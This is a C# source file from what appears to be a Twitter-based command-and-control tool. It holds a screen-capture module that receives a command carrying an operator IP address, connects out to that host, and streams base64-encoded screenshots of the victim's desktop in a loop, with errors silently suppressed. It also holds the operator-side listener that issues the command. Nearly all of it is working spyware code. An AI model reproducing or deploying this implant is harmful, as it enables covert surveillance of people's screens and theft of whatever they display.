using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace TwitterCommandAndControl
{
    public static class ScreenCaptureHandler
    {
        private const int PORT = 7777;
        public static void Respond(string command)
        {
            NetworkStream networkStream = null;

            command = command.ToLower();
            if (command.Contains("#screen"))
            {
                var ip = command.Split('#').Where(x => x.StartsWith("ip=")).Select(x => x.Split('=')[1]).FirstOrDefault();
                try
                {
                    using (var tcpClient = new TcpClient())
                    {
                        tcpClient.Connect(ip, PORT);
                        using (networkStream = tcpClient.GetStream())
                        using (var reader = new StreamReader(networkStream))
                        using (var writer = new StreamWriter(networkStream))
                        {
                            while (tcpClient.Connected)
                            {
                                using (var image = CaptureScreen.GetDesktopImage())
                                using (var memoryStream = new MemoryStream())
                                {
                                    image.Save(memoryStream, System.Drawing.Imaging.ImageFormat.Png);
                                    writer.WriteLine(System.Convert.ToBase64String(memoryStream.ToArray()));
                                    writer.Flush();
                                }
                                if (reader.ReadLine() != "X") return;
                            }
                        }
                    }
                }
                catch { }
            }
        }

        public static TcpClient Request(string commandPrefix)
        {
            TcpClient client = null;
            var listenerTask = Task.Factory.StartNew(() =>
            {
                TcpListener listener = new TcpListener(IPAddress.Any, PORT);
                listener.Start();
                client = listener.AcceptTcpClient();
                listener.Stop();
            });
            Messenger.Send(commandPrefix + " #screen #ip=127.0.0.1");
            listenerTask.Wait();
            return client;
        }

        #region Screen Capture Helper Classes
        private class PlatformInvokeGDI32
        {
            public const int SRCCOPY = 13369376;
            [DllImport("gdi32.dll", EntryPoint = "DeleteDC")]
            public static extern IntPtr DeleteDC(IntPtr hDc);

            [DllImport("gdi32.dll", EntryPoint = "DeleteObject")]
            public static extern IntPtr DeleteObject(IntPtr hDc);

            [DllImport("gdi32.dll", EntryPoint = "BitBlt")]
            public static extern bool BitBlt(IntPtr hdcDest, int xDest,
                int yDest, int wDest, int hDest, IntPtr hdcSource,
                int xSrc, int ySrc, int RasterOp);

            [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleBitmap")]
            public static extern IntPtr CreateCompatibleBitmap(IntPtr hdc,
                int nWidth, int nHeight);

            [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleDC")]
            public static extern IntPtr CreateCompatibleDC(IntPtr hdc);

            [DllImport("gdi32.dll", EntryPoint = "SelectObject")]
            public static extern IntPtr SelectObject(IntPtr hdc, IntPtr bmp);
        }

        private class PlatformInvokeUSER32
        {
            public const int SM_CXSCREEN = 0;
            public const int SM_CYSCREEN = 1;

            [DllImport("user32.dll", EntryPoint = "GetDesktopWindow")]
            public static extern IntPtr GetDesktopWindow();

            [DllImport("user32.dll", EntryPoint = "GetDC")]
            public static extern IntPtr GetDC(IntPtr ptr);

            [DllImport("user32.dll", EntryPoint = "GetSystemMetrics")]
            public static extern int GetSystemMetrics(int abc);

            [DllImport("user32.dll", EntryPoint = "GetWindowDC")]
            public static extern IntPtr GetWindowDC(Int32 ptr);

            [DllImport("user32.dll", EntryPoint = "ReleaseDC")]
            public static extern IntPtr ReleaseDC(IntPtr hWnd, IntPtr hDc);
        }

        private class CaptureScreen
        {
            protected static IntPtr m_HBitmap;


            public static Bitmap GetDesktopImage()
            {
                SIZE size;
                IntPtr hBitmap;
                IntPtr hDC = PlatformInvokeUSER32.GetDC
                              (PlatformInvokeUSER32.GetDesktopWindow());
                IntPtr hMemDC = PlatformInvokeGDI32.CreateCompatibleDC(hDC);
                size.cx = PlatformInvokeUSER32.GetSystemMetrics
                          (PlatformInvokeUSER32.SM_CXSCREEN);
                size.cy = PlatformInvokeUSER32.GetSystemMetrics
                          (PlatformInvokeUSER32.SM_CYSCREEN);
                hBitmap = PlatformInvokeGDI32.CreateCompatibleBitmap
                            (hDC, size.cx, size.cy);
                if (hBitmap != IntPtr.Zero)
                {
                    IntPtr hOld = (IntPtr)PlatformInvokeGDI32.SelectObject
                                           (hMemDC, hBitmap);
                    PlatformInvokeGDI32.BitBlt(hMemDC, 0, 0, size.cx, size.cy, hDC,
                                               0, 0, PlatformInvokeGDI32.SRCCOPY);
                    PlatformInvokeGDI32.SelectObject(hMemDC, hOld);
                    PlatformInvokeGDI32.DeleteDC(hMemDC);
                    PlatformInvokeUSER32.ReleaseDC(PlatformInvokeUSER32.
                                                   GetDesktopWindow(), hDC);
                    Bitmap bmp = System.Drawing.Image.FromHbitmap(hBitmap);
                    PlatformInvokeGDI32.DeleteObject(hBitmap);
                    GC.Collect();
                    return bmp;
                }
                return null;
            }


            public struct SIZE
            {
                public int cx;
                public int cy;
            }
        }
        #endregion
    }
}